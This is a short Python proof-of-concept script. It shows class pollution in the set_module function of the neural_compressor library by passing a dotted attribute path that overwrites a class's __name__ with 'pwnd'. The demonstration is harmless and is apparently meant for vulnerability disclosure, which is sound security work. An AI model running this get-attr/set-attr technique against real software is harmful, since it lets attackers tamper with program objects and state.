# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: set_module
# Type: get-attr-set-attr

from neural_compressor.torch.utils import set_module

class Target: pass
target = Target()

class MockModel:
  pass

model = MockModel()
model.target = target

payload_value = "pwnd"
PAYLOAD = "target.__class__.__name__"

def run_poc():
  set_module(model, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
